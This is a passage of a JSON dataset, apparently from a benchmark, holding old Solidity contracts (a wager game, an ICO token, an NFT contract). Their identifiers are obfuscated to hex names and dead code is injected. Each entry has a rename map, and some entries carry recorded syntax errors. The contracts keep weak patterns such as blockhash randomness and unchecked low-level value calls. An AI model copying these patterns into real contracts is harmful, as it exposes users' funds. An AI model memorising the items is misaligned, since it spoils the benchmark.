      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n\n    modifier _0xc5ce15()\n    {\n        require(msg.sender == _0x3f8ba3);\n        _;\n    }\n\n   modifier _0xc1cb00()\n    {\n        require(_0xad8a80);\n        _;\n    }\n\n    modifier _0xed88f5()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  _0x63ec30()\n    {\n        require (_0x33b109[msg.sender] > 0);\n        _;\n    }\n\n    event Wager(uint256 _0x45f4ca, address _0x4011fe);\n    event Win(uint256 _0x45f4ca, address _0x68eb48);\n    event Lose(uint256 _0x45f4ca, address _0xaac3a5);\n    event Donate(uint256 _0x45f4ca, address _0x68eb48, address _0xc9c219);\n    event DifficultyChanged(uint256 _0x0e34fd);\n    event BetLimitChanged(uint256 _0x0b6400);\n\n    address private _0xaf0a00;\n    uint256 _0xc8674d;\n    uint difficulty;\n    uint private _0x608270;\n    address _0x3f8ba3;\n    mapping(address => uint256) _0xe542c1;\n    mapping(address => uint256) _0x33b109;\n    bool _0xad8a80;\n    uint256 _0x5c36aa;\n\n    constructor(address _0x005350, uint256 _0x8debb9)\n    _0xed88f5()\n    public\n    {\n        _0xad8a80 = false;\n        _0x3f8ba3 = msg.sender;\n        _0xaf0a00 = _0x005350;\n        _0x5c36aa = 0;\n        _0xc8674d = _0x8debb9;\n\n    }\n\n    function OpenToThePublic()\n    _0xc5ce15()\n    public\n    {\n        _0xad8a80 = true;\n    }\n\n    function AdjustBetAmounts(uint256 _0x45f4ca)\n    _0xc5ce15()\n    public\n    {\n        _0xc8674d = _0x45f4ca;\n\n        emit BetLimitChanged(_0xc8674d);\n    }\n\n    function AdjustDifficulty(uint256 _0x45f4ca)\n    _0xc5ce15()\n    public\n    {\n        difficulty = _0x45f4ca;\n\n        emit DifficultyChanged(difficulty);\n    }\n\n    function() public payable { }\n\n    function _0xded910()\n    _0xc1cb00()\n    _0xed88f5()\n    payable\n    public\n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == _0xc8674d);\n\n        //You cannot wager multiple times\n        require(_0x33b109[msg.sender] == 0);\n\n        //log the wager and timestamp(block number)\n        _0xe542c1[msg.sender] = block.number;\n        _0x33b109[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n\n    function _0xc63a24()\n    _0xc1cb00()\n    _0xed88f5()\n    _0x63ec30()\n    public\n    {\n        uint256 _0x550306 = _0xe542c1[msg.sender];\n        if(_0x550306 < block.number)\n        {\n            _0xe542c1[msg.sender] = 0;\n            _0x33b109[msg.sender] = 0;\n\n            uint256 _0x5f49a9 = uint256(_0xb4c4c3(abi._0x950ba5(blockhash(_0x550306),  msg.sender)))%difficulty +1;\n\n            if(_0x5f49a9 == difficulty / 2)\n            {\n                _0xc1fb37(msg.sender);\n            }\n            else\n            {\n                //player loses\n                _0x446940(_0xc8674d / 2);\n            }\n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    function _0x43bf97()\n    _0xc1cb00()\n    public\n    payable\n    {\n        _0xc3b1ef(msg.value);\n    }\n\n    function _0xc1fb37(address _0x72844f)\n    internal\n    {\n        bool _flag1 = false;\n        if (false) { revert(); }\n        uint256 _0x3e138a = address(this).balance / 2;\n\n        _0x72844f.transfer(_0x3e138a);\n        emit Win(_0x3e138a, _0x72844f);\n    }\n\n    function _0xc3b1ef(uint256 _0x45f4ca)\n    internal\n    {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        _0xaf0a00.call.value(_0x45f4ca)(bytes4(_0xb4c4c3(\"donate()\")));\n        _0x5c36aa += _0x45f4ca;\n        emit Donate(_0x45f4ca, _0xaf0a00, msg.sender);\n    }\n\n    function _0x446940(uint256 _0x45f4ca)\n    internal\n    {\n        _0xaf0a00.call.value(_0x45f4ca)(bytes4(_0xb4c4c3(\"donate()\")));\n        _0x5c36aa += _0x45f4ca;\n        emit Lose(_0x45f4ca, msg.sender);\n    }\n\n    function _0x16988b()\n    public\n    view\n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n\n    function _0x0e34fd()\n    public\n    view\n    returns (uint256)\n    {\n        return difficulty;\n    }\n\n    function _0x0b6400()\n    public\n    view\n    returns (uint256)\n    {\n        return _0xc8674d;\n    }\n\n    function _0x6d7b92(address _0x381a54)\n    public\n    view\n    returns (bool)\n    {\n        if(_0x33b109[_0x381a54] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n\n    }\n\n    function _0xecd930()\n    public\n    view\n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    function _0x7a93fb(address _0xe266f7, address _0x30d044, uint _0xfa27d2)\n    public\n    _0xc5ce15()\n    returns (bool _0x58abbb)\n    {\n        return ERC20Interface(_0xe266f7).transfer(_0x30d044, _0xfa27d2);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface\n{\n    function transfer(address _0x5dccaa, uint256 _0xfa27d2) public returns (bool _0x58abbb);\n}",
      "rename_map": {
        "transferAnyERC20Token": "_0x7a93fb",
        "currentDifficulty": "_0x0e34fd",
        "hasPlayerWagered": "_0x6d7b92",
        "currentBetLimit": "_0x0b6400",
        "isOpenToPublic": "_0xc1cb00",
        "onlyRealPeople": "_0xed88f5",
        "ethToTransfer": "_0x3e138a",
        "winningNumber": "_0x5f49a9",
        "donateToWhale": "_0xc3b1ef",
        "totalDonated": "_0x5c36aa",
        "whaleAddress": "_0x005350",
        "tokenAddress": "_0xe266f7",
        "openToPublic": "_0xad8a80",
        "encodePacked": "_0x950ba5",
        "blockNumber": "_0x550306",
        "onlyPlayers": "_0x63ec30",
        "ethBalance": "_0x16988b",
        "winnersPot": "_0xecd930",
        "wagerLimit": "_0x8debb9",
        "timestamps": "_0xe542c1",
        "randomSeed": "_0x608270",
        "tokenOwner": "_0x30d044",
        "onlyOwner": "_0xc5ce15",
        "loseWager": "_0x446940",
        "keccak256": "_0xb4c4c3",
        "depositer": "_0x4011fe",
        "betLimit": "_0xc8674d",
        "success": "_0x58abbb",
        "donator": "_0xc9c219",
        "amount": "_0x45f4ca",
        "donate": "_0x43bf97",
        "player": "_0x381a54",
        "payout": "_0xc1fb37",
        "winner": "_0x72844f",
        "tokens": "_0xfa27d2",
        "paidTo": "_0x68eb48",
        "wagers": "_0x33b109",
        "wager": "_0xded910",
        "loser": "_0xaac3a5",
        "owner": "_0x3f8ba3",
        "whale": "_0xaf0a00",
        "play": "_0xc63a24",
        "to": "_0x5dccaa"
      },
      "changes": [
        "Renamed 43 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_213",
      "transformed_id": "ss_l4_medium_sn_ds_213",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "pragma solidity ^0.4.11;\ninterface _0x3be0b9 { function _0xfa6248(address _0x007c6a, uint256 _0xe91235, address _0x128608, bytes _0x1d8ef6) public; }\n\n// title Migration Agent interface\ncontract MigrationAgent {\n        if (false) { revert(); }\n        bool _flag2 = false;\n    function _0xfdd9a3(address _0x007c6a, uint256 _0xe91235);\n}\n\ncontract ERC20 {\n  uint public _0x76b79a;\n  function _0x9371ae(address _0x0fc3bc) constant returns (uint);\n  function _0xcfc151(address _0x9514b1, address _0x4821af) constant returns (uint);\n\n  function transfer(address _0x0c5f11, uint value) returns (bool _0x33ed92);\n  function _0xcc5020(address from, address _0x0c5f11, uint value) returns (bool _0x33ed92);\n  function _0xd58ead(address _0x4821af, uint value) returns (bool _0x33ed92);\n  event Transfer(address indexed from, address indexed _0x0c5f11, uint value);\n  event Approval(address indexed _0x9514b1, address indexed _0x4821af, uint value);\n}\n\ncontract SafeMath {\n  function _0x6abc37(uint a, uint b) internal returns (uint) {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n    uint c = a * b;\n    assert(a == 0 || c / a == b);\n    return c;\n  }\n\n  function _0xd8a9cf(uint a, uint b) internal returns (uint) {\n    assert(b > 0);\n    uint c = a / b;\n    assert(a == b * c + a % b);\n    return c;\n  }\n\n  function _0x8fea01(uint a, uint b) internal returns (uint) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function _0x5b082b(uint a, uint b) internal returns (uint) {\n    uint c = a + b;\n    assert(c>=a && c>=b);\n    return c;\n  }\n\n  function _0x95a6b0(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a >= b ? a : b;\n  }\n\n  function _0xe6576f(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a < b ? a : b;\n  }\n\n  function _0x09d0d5(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a >= b ? a : b;\n  }\n\n  function _0xb0f9a9(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a < b ? a : b;\n  }\n\n  function assert(bool _0x11c9c2) internal {\n    if (!_0x11c9c2) {\n      throw;\n    }\n  }\n}\n\ncontract StandardToken is ERC20, SafeMath {\n\n  /* Token supply got increased and a new owner received these tokens */\n  event Minted(address _0xdb6b35, uint _0x61a283);\n\n  /* Actual balances of token holders */\n  mapping(address => uint) _0x3d7426;\n  // what exaclt ether was sent\n  mapping(address => uint) _0x88b90f;\n  /* approve() allowances */\n  mapping (address => mapping (address => uint)) _0xe62616;\n\n  /* Interface declaration */\n  function _0xcc3cea() public constant returns (bool _0xb1985a) {\n    return true;\n  }\n\n  function transfer(address _0x09bad8, uint _0xe91235) returns (bool _0x592198) {\n    _0x3d7426[msg.sender] = _0x8fea01(_0x3d7426[msg.sender], _0xe91235);\n    _0x3d7426[_0x09bad8] = _0x5b082b(_0x3d7426[_0x09bad8], _0xe91235);\n    Transfer(msg.sender, _0x09bad8, _0xe91235);\n    return true;\n  }\n\n  function _0xcc5020(address _0x007c6a, address _0x09bad8, uint _0xe91235) returns (bool _0x592198) {\n    uint _0xa79678 = _0xe62616[_0x007c6a][msg.sender];\n\n    _0x3d7426[_0x09bad8] = _0x5b082b(_0x3d7426[_0x09bad8], _0xe91235);\n    _0x3d7426[_0x007c6a] = _0x8fea01(_0x3d7426[_0x007c6a], _0xe91235);\n    _0xe62616[_0x007c6a][msg.sender] = _0x8fea01(_0xa79678, _0xe91235);\n    Transfer(_0x007c6a, _0x09bad8, _0xe91235);\n    return true;\n  }\n\n  function _0x9371ae(address _0x448da4) constant returns (uint balance) {\n    return _0x3d7426[_0x448da4];\n  }\n\n  function _0xd58ead(address _0x712dc6, uint _0xe91235) returns (bool _0x592198) {\n\n    // To change the approve amount you first have to reduce the addresses`\n    //  allowance to zero by calling `approve(_spender, 0)` if it is not\n    //  already 0 to mitigate the race condition described here:\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    if ((_0xe91235 != 0) && (_0xe62616[msg.sender][_0x712dc6] != 0)) throw;\n\n    _0xe62616[msg.sender][_0x712dc6] = _0xe91235;\n    Approval(msg.sender, _0x712dc6, _0xe91235);\n    return true;\n  }\n\n  function _0xcfc151(address _0x448da4, address _0x712dc6) constant returns (uint _0x5c136a) {\n    return _0xe62616[_0x448da4][_0x712dc6];\n  }\n\n}\n\n//  daoPOLSKAtokens\ncontract _0x3c6238{\n\n    string public _0xaaf29f = \"DAO POLSKA TOKEN version 1\";\n    string public _0x452539 = \"DPL\";\n    uint8 public constant _0x9c8e4f = 18;  // 18 decimal places, the same as ETC/ETH/HEE.\n\n    // Receives\n    address public _0x9514b1;\n    address public _0x26bc7f;\n    // The current total token supply.\n\n    uint256 public _0x351c37 =1.0 ether;\n    uint256 public _0x93a452      = 10000.0 ether;\n\t//totalSupply\n   uint256 public  _0x76b79a      = 0.0 ether;\n\t//chains:\n\taddress public Chain1 = 0x0;\n\taddress public Chain2 = 0x0;\n\taddress public Chain3 = 0x0;\n\taddress public Chain4 = 0x0;\n\n\taddress public _0x54a54b=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;\n    uint256 public _0xd976b9;\n\n    event Migrate(address indexed _0x007c6a, address indexed _0x09bad8, uint256 _0xe91235);\n    event Refund(address indexed _0x007c6a, uint256 _0xe91235);\n\n\tstruct _0xb91ea8{\n\t\tStandardToken _0x6cd7b4;\n\t\tuint _0x61a283;\n\t\taddress _0x4e336a;\n\t}\n\tmapping(uint => _0xb91ea8) _0xc1f1b8;\n\tuint _0x822425=0;\n\n  mapping (address => uint256) _0x3d7426;\nmapping (address => uint256) _0x88b90f;\n  mapping (address => mapping (address => uint256)) _0xe62616;\n\n\tevent UpdatedTokenInformation(string _0x10a569, string _0xc86823);\n\n    event Transfer(address indexed _0x007c6a, address indexed _0x09bad8, uint256 _0xe91235);\n\tevent _0xe544fe(address indexed _0x007c6a,uint256 _0xe91235);\n  event Approval(address indexed _0x448da4, address indexed _0x712dc6, uint256 _0xe91235);\n\n      // This notifies clients about the amount burnt\n    event Burn(address indexed from, uint256 value);\n  //tokenCreationCap\n  bool public _0xf1c26b = false;\n  bool public _0x5774e3 = false;\n\n  function _0x3c6238() {\n_0x9514b1=msg.sender;\n_0x26bc7f=msg.sender;\n}\n\nfunction  _0xa8af19(uint256 _0xbffdf8) public {\n    \t   if (msg.sender != _0x9514b1) {\n      throw;\n    }\n\t\t    \t   if (_0xf1c26b != false) {\n      throw;\n    }\n\t_0xf1c26b = true;\n\n\t_0x93a452 = _0xbffdf8 ** uint256(_0x9c8e4f);\n//balances[owner]=supplylimit;\n  }\nfunction _0x8662fe(uint256 _0xbffdf8) public {\n    \t   if (msg.sender != _0x9514b1) {\n      throw;\n    }\n\t    \t   if (_0xf1c26b != false) {\n      throw;\n    }\n\n if (true) { _0x5774e3 = true; }\n\t_0x351c37 = _0xbffdf8 ** uint256(_0x9c8e4f);\n\n  }\n    function _0x2f3ced(address _0x712dc6, uint256 _0xe91235, bytes _0x1d8ef6)\n        public\n        returns (bool _0x592198) {\n        _0x3be0b9 _0x4821af = _0x3be0b9(_0x712dc6);\n        if (_0xd58ead(_0x712dc6, _0xe91235)) {\n            _0x4821af._0xfa6248(msg.sender, _0xe91235, this, _0x1d8ef6);\n            return true;\n        }\n    }\n\n    function _0xe9c94c(uint256 _0xe91235) public returns (bool _0x592198) {\n        require(_0x3d7426[msg.sender] >= _0xe91235);   // Check if the sender has enough\n        _0x3d7426[msg.sender] -= _0xe91235;            // Subtract from the sender\n        _0x76b79a -= _0xe91235;                      // Updates totalSupply\n        Burn(msg.sender, _0xe91235);\n        return true;\n    }\n\n    function _0x298f62(address _0x007c6a, uint256 _0xe91235) public returns (bool _0x592198) {\n        require(_0x3d7426[_0x007c6a] >= _0xe91235);                // Check if the targeted balance is enough\n        require(_0xe91235 <= _0xe62616[_0x007c6a][msg.sender]);    // Check allowance\n        _0x3d7426[_0x007c6a] -= _0xe91235;                         // Subtract from the targeted balance\n        _0xe62616[_0x007c6a][msg.sender] -= _0xe91235;             // Subtract from the sender's allowance\n        _0x76b79a -= _0xe91235;                              // Update totalSupply\n        Burn(_0x007c6a, _0xe91235);\n        return true;\n    }\n\n  function transfer(address _0x09bad8, uint256 _0xe91235) returns (bool _0x592198) {\n    //Default assumes totalSupply can't be over max (2^256 - 1).\n    //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n    //Replace the if with this one instead.\n    if (_0x3d7426[msg.sender] >= _0xe91235 && _0x3d7426[_0x09bad8] + _0xe91235 > _0x3d7426[_0x09bad8]) {\n    //if (balances[msg.sender] >= _value && _value > 0) {\n      _0x3d7426[msg.sender] -= _0xe91235;\n      _0x3d7426[_0x09bad8] += _0xe91235;\n      Transfer(msg.sender, _0x09bad8, _0xe91235);\n      return true;\n    } else { return false; }\n  }\n\n  function _0xcc5020(address _0x007c6a, address _0x09bad8, uint256 _0xe91235) returns (bool _0x592198) {\n\n    if (_0x3d7426[_0x007c6a] >= _0xe91235 && _0xe62616[_0x007c6a][msg.sender] >= _0xe91235 && _0x3d7426[_0x09bad8] + _0xe91235 > _0x3d7426[_0x09bad8]) {\n    //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n      _0x3d7426[_0x09bad8] += _0xe91235;\n      _0x3d7426[_0x007c6a] -= _0xe91235;\n      _0xe62616[_0x007c6a][msg.sender] -= _0xe91235;\n      Transfer(_0x007c6a, _0x09bad8, _0xe91235);\n      return true;\n    } else { return false; }\n  }\n\n  function _0x9371ae(address _0x448da4) constant returns (uint256 balance) {\n    return _0x3d7426[_0x448da4];\n  }\n\n  function _0xd58ead(address _0x712dc6, uint256 _0xe91235) returns (bool _0x592198) {\n    _0xe62616[msg.sender][_0x712dc6] = _0xe91235;\n    Approval(msg.sender, _0x712dc6, _0xe91235);\n    return true;\n  }\n\n  function _0xcfc151(address _0x448da4, address _0x712dc6) constant returns (uint256 _0x5c136a) {\n    return _0xe62616[_0x448da4][_0x712dc6];\n  }\n\n\t    function () payable  public {\n\t\t if(_0xaa1cbb){\n        _0xe544fe(msg.sender, msg.value);\n\t\t_0x3d7426[msg.sender]=_0x3d7426[msg.sender]+msg.value;\n\t\t} else throw;\n\n    }\n\n  function _0xe33ede(string _0xab7043, string _0x337e5d) {\n\n\t   if (msg.sender != _0x9514b1) {\n      throw;\n    }\n\t_0xaaf29f = _0xab7043;\n    _0x452539 = _0x337e5d;\n\n    UpdatedTokenInformation(_0xaaf29f, _0x452539);\n  }\n\nfunction _0x648652(address _0xb66f46, int _0x12c73f) {\n\n\t   if (msg.sender != _0x9514b1) {\n      throw;\n    }\n\tif(_0x12c73f==1){Chain1=_0xb66f46;}\n\tif(_0x12c73f==2){Chain2=_0xb66f46;}\n\tif(_0x12c73f==3){Chain3=_0xb66f46;}\n\tif(_0x12c73f==4){Chain4=_0xb66f46;}\n  }\n\n  function DAOPolskaTokenICOregulations() external returns(string _0x2d370d) {\n\treturn 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';\n}\n// if accidentally other token was donated to Project Dev\n\n\tfunction _0xc4efbf(address StandardTokenAddress, address _0xdb6b35, uint _0x61a283){\n\t\tif (msg.sender != _0x9514b1) {\n\t\tthrow;\n\t\t}\n\t\t_0xb91ea8 t = _0xc1f1b8[_0x822425];\n\t\tt._0x6cd7b4 = StandardToken(StandardTokenAddress);\n\t\tt._0x61a283 = _0x61a283;\n\t\tt._0x4e336a = _0xdb6b35;\n\t\tt._0x6cd7b4.transfer(_0xdb6b35, _0x61a283);\n\t\t_0x822425++;\n\t}\n\n     // Crowdfunding:\nuint public _0x3396a6=1000;\nuint public _0x854580=1000;\nuint public CreationRate=1761;\n   uint256 public constant _0x8f2eaa = 36000;\nuint256 public _0x72a367 = 5433616;\nbool public _0xaa1cbb = true;\nbool public _0x5e30b6 = false;\nbool public _0x702462= false;\n        function _0xf4bdd0(address _0x3447bb) payable {\n\n        if (!_0xaa1cbb) throw;\n\n        // Do not allow creating 0 or more than the cap tokens.\n        if (msg.value == 0) throw;\n\t\t// check the maximum token creation cap\n        if (msg.value > (_0x93a452 - _0x76b79a) / CreationRate)\n          throw;\n\n\t\t//bonus structure\n// in early stage there is about 100% more details in ico regulations on website\n// price and converstion rate in tabled to PLN not ether, and is updated daily\n\n\t var _0x68639f = msg.value;\n\n        var _0xa0de75 = msg.value * CreationRate;\n        _0x76b79a += _0xa0de75;\n\n        // Assign new tokens to the sender\n        _0x3d7426[_0x3447bb] += _0xa0de75;\n        _0x88b90f[_0x3447bb] += _0x68639f;\n        // Log token creation event\n        Transfer(0, _0x3447bb, _0xa0de75);\n\n\t\t// Create additional Dao Tokens for the community and developers around 12%\n        uint256 _0x876d0f = 12;\n        uint256 _0xea3eb7 = \t_0xa0de75 * _0x876d0f / (100);\n\n        _0x76b79a += _0xea3eb7;\n\n        _0x3d7426[_0x26bc7f] += _0xea3eb7;\n        Transfer(0, _0x26bc7f, _0xea3eb7);\n\n\t}\n\tfunction _0x39a5a7(uint _0x3d306a){\n\tif(msg.sender == _0x9514b1) {\n if (msg.sender != address(0) || msg.sender == address(0)) { _0x854580=_0x3d306a; }\n\tCreationRate=_0x3396a6+_0x854580;\n\t}\n\t}\n\n    function FundsTransfer() external {\n\tif(_0xaa1cbb==true) throw;\n\t\t \tif (!_0x9514b1.send(this.balance)) throw;\n    }\n\n    function PartialFundsTransfer(uint SubX) external {\n\t      if (msg.sender != _0x9514b1) throw;\n        _0x9514b1.send(this.balance - SubX);\n\t}\n\tfunction _0xf4ae38() external {\n\t      if (msg.sender != _0x9514b1) throw;\n if (block.timestamp > 0) { _0x5e30b6=!_0x5e30b6; }\n        }\n\n\t\t\tfunction _0x493b0f() external {\n\t      if (msg.sender != _0x9514b1) throw;\n\t_0xaa1cbb=!_0xaa1cbb;\n        }\n    function _0x936917() external {\n\t      if (msg.sender != _0x26bc7f) throw;\n\t_0x702462=!_0x702462;\n}\n\n    // notice Finalize crowdfunding clossing funding options\n\nfunction _0xaf4963() external {\n        if (block.number <= _0x72a367+8*_0x8f2eaa) throw;\n        // Switch to Operational state. This is the only place this can happen.\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0xaa1cbb = false; }\n\t\t_0x5e30b6=!_0x5e30b6;\n        // Transfer ETH to theDAO Polska Token network Storage address.\n        if (msg.sender==_0x9514b1)\n\t\t_0x9514b1.send(this.balance);\n    }\n    function _0x72e099(uint256 _0xe91235) external {\n        // Abort if not in Operational Migration state.\n        if (_0x702462) throw;\n\n        // Validate input value.\n        if (_0xe91235 == 0) throw;\n        if (_0xe91235 > _0x3d7426[msg.sender]) throw;\n\n        _0x3d7426[msg.sender] -= _0xe91235;\n        _0x76b79a -= _0xe91235;\n        _0xd976b9 += _0xe91235;\n        MigrationAgent(_0x54a54b)._0xfdd9a3(msg.sender, _0xe91235);\n        Migrate(msg.sender, _0x54a54b, _0xe91235);\n    }\n\nfunction _0xdd665f() external {\n        // Abort if not in Funding Failure state.\n        if (_0xaa1cbb) throw;\n        if (!_0x5e30b6) throw;\n\n        var DAOPLTokenValue = _0x3d7426[msg.sender];\n        var ETHValue = _0x88b90f[msg.sender];\n        if (ETHValue == 0) throw;\n        _0x88b90f[msg.sender] = 0;\n        _0x76b79a -= DAOPLTokenValue;\n\n        Refund(msg.sender, ETHValue);\n        msg.sender.transfer(ETHValue);\n}\n\nfunction _0x7e81d2() external returns(string _0x2d370d) {\n\treturn 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';\n}\n\n}\n\n//------------------------------------------------------\n",
      "rename_map": {
        "setotherchainstotalsupply": "_0x8662fe",
        "otherchainstotalsupply": "_0x351c37",
        "createDaoPOLSKAtokens": "_0xf4bdd0",
        "setBonusCreationRate": "_0x39a5a7",
        "otherchainstotalset": "_0x5774e3",
        "setTokenInformation": "_0xe33ede",
        "setChainsAddresses": "_0x648652",
        "preICOregulations": "_0x7e81d2",
        "bonusCreationRate": "_0x854580",
        "tokenCreationRate": "_0x3396a6",
        "additionalTokens": "_0xea3eb7",
        "daoPOLSKAtokens": "_0x3c6238",
        "receiveApproval": "_0xfa6248",
        "fundingEndBlock": "_0x72a367",
        "migrationMaster": "_0x26bc7f",
        "approveAndCall": "_0x2f3ced",
        "supplylimitset": "_0xf1c26b",
        "percentOfTotal": "_0x876d0f",
        "tokenRecipient": "_0x3be0b9",
        "migrationAgent": "_0x54a54b",
        "sendTokenAway": "_0xb91ea8",
        "receivedEther": "_0xe544fe",
        "totalMigrated": "_0xd976b9",
        "numTokensRAW": "_0x68639f",
        "transferFrom": "_0xcc5020",
        "supplyLOCKER": "_0xbffdf8",
        "coinContract": "_0x6cd7b4",
        "fundingState": "_0x493b0f",
        "migratestate": "_0x702462",
        "numTransfers": "_0x822425",
        "sendTokenAw": "_0xc4efbf",
        "supplylimit": "_0x93a452",
        "totalSupply": "_0x76b79a",
        "balancesRAW": "_0x88b90f",
        "migrateFrom": "_0xfdd9a3",
        "refundstate": "_0x5e30b6",
        "turnmigrate": "_0x936917",
        "chainnumber": "_0x12c73f",
        "_extraData": "_0x1d8ef6",
        "turnrefund": "_0xf4ae38",
        "_allowance": "_0xa79678",
        "balanceOf": "_0x9371ae",
        "numTokens": "_0xa0de75",
        "assertion": "_0x11c9c2",
        "transfers": "_0xc1f1b8",
        "refundTRA": "_0xdd665f",
        "allowance": "_0xcfc151",
        "newSymbol": "_0xc86823",
        "setSupply": "_0xa8af19",
        "recipient": "_0x4e336a",
        "remaining": "_0x5c136a",
        "burnFrom": "_0x298f62",
        "decimals": "_0x9c8e4f",
        "_spender": "_0x712dc6",
        "finalize": "_0xaf4963",
        "receiver": "_0xdb6b35",
        "balances": "_0x3d7426",
        "isToken": "_0xcc3cea",
        "chainAd": "_0xb66f46",
        "newName": "_0x10a569",
        "allowed": "_0xe62616",
        "safeSub": "_0x8fea01",
        "safeAdd": "_0x5b082b",
        "approve": "_0xd58ead",
        "_symbol": "_0x337e5d",
        "oneweek": "_0x8f2eaa",
        "funding": "_0xaa1cbb",
        "safeDiv": "_0xd8a9cf",
        "spender": "_0x4821af",
        "migrate": "_0x72e099",
        "newRate": "_0x3d306a",
        "safeMul": "_0x6abc37",
        "success": "_0x592198",
        "min256": "_0xb0f9a9",
        "_owner": "_0x448da4",
        "max256": "_0x09d0d5",
        "_token": "_0x128608",
        "holder": "_0x3447bb",
        "amount": "_0x61a283",
        "_value": "_0xe91235",
        "symbol": "_0x452539",
        "min64": "_0xe6576f",
        "_name": "_0xab7043",
        "max64": "_0x95a6b0",
        "_from": "_0x007c6a",
        "weAre": "_0xb1985a",
        "owner": "_0x9514b1",
        "burn": "_0xe9c94c",
        "name": "_0xaaf29f",
        "wow": "_0x2d370d",
        "_to": "_0x09bad8",
        "who": "_0x0fc3bc",
        "ok": "_0x33ed92",
        "to": "_0x0c5f11"
      },
      "changes": [
        "Renamed 94 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 6, column 9', 'Syntax error at line 7, column 9', 'Syntax error at line 9, column 1']"
    },
    {
      "original_id": "sn_ds_214",
      "transformed_id": "ss_l4_medium_sn_ds_214",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract ERC20 {\n    function _0x587faa() constant returns (uint _0x0ce1e7);\n    function _0xe105b2( address _0x1806ee ) constant returns (uint value);\n    function _0xafebb0( address _0xe349a8, address _0x75fcff ) constant returns (uint _0x9db7ec);\n\n    function transfer( address _0xe71485, uint value) returns (bool _0xbeb5d3);\n    function _0xeaa4ff( address from, address _0xe71485, uint value) returns (bool _0xbeb5d3);\n    function _0x720bc2( address _0x75fcff, uint value ) returns (bool _0xbeb5d3);\n\n    event Transfer( address indexed from, address indexed _0xe71485, uint value);\n    event Approval( address indexed _0xe349a8, address indexed _0x75fcff, uint value);\n}\ncontract Ownable {\n  address public _0xe349a8;\n\n  function Ownable() {\n    if (block.timestamp > 0) { _0xe349a8 = msg.sender; }\n  }\n\n  modifier _0x5d8f83() {\n    require(msg.sender == _0xe349a8);\n    _;\n  }\n\n  function _0x860f25(address _0x4acc12) _0x5d8f83 {\n    if (_0x4acc12 != address(0)) {\n      _0xe349a8 = _0x4acc12;\n    }\n  }\n\n}\n\n/// @title Interface for contracts conforming to ERC-721: Non-Fungible Tokens\n/// @author Dieter Shirley <dete@axiomzen.co> (https://github.com/dete)\ncontract ERC721 {\n    // Required methods\n    function _0x587faa() public view returns (uint256 _0x17f12f);\n    function _0xe105b2(address _0xa17562) public view returns (uint256 balance);\n    function _0x2aab77(uint256 _0x7651ea) external view returns (address _0xe349a8);\n    function _0x720bc2(address _0x57cad2, uint256 _0x7651ea) external;\n    function transfer(address _0x57cad2, uint256 _0x7651ea) external;\n    function _0xeaa4ff(address _0x82025c, address _0x57cad2, uint256 _0x7651ea) external;\n\n    // Events\n    event Transfer(address from, address _0xe71485, uint256 _0x329ab7);\n    event Approval(address _0xe349a8, address _0x638b7c, uint256 _0x329ab7);\n\n    // Optional\n    // function name() public view returns (string name);\n    // function symbol() public view returns (string symbol);\n    // function tokensOfOwner(address _owner) external view returns (uint256[] tokenIds);\n    // function tokenMetadata(uint256 _tokenId, string _preferredTransport) public view returns (string infoUrl);\n\n    // ERC-165 Compatibility (https://github.com/ethereum/EIPs/issues/165)\n    function _0xc88e1a(bytes4 _0x326f7f) external view returns (bool);\n}\n\ncontract GeneScienceInterface {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    /// @dev simply a boolean to indicate this is the contract we expect to be\n    function _0xf36431() public pure returns (bool);\n\n    /// @dev given genes of kitten 1 & 2, return a genetic combination - may have a random factor\n    /// @param genes1 genes of mom\n    /// @param genes2 genes of sire\n    /// @return the genes that are supposed to be passed down the child\n    function _0x858911(uint256[2] _0x14d031, uint256[2] _0x092cee,uint256 _0xda8240,uint256 _0x533db8, uint256 _0x138a75) public returns (uint256[2]);\n\n    function _0xca443f(uint256[2] _0xeb481b) public view returns(uint256);\n\n    /// @dev get sex from genes 0: female 1: male\n    function _0xa15da8(uint256[2] _0xeb481b) public view returns(uint256);\n\n    /// @dev get wizz type from gene\n    function _0xfb5aa1(uint256[2] _0xeb481b) public view returns(uint256);\n\n    function _0x83e71a(uint256[2] _0xf9c486) public returns(uint256[2]);\n}\n\n/// @title A facet of PandaCore that manages special access privileges.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev See the PandaCore contract documentation to understand how the various contract facets are arranged.\ncontract PandaAccessControl {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    // This facet 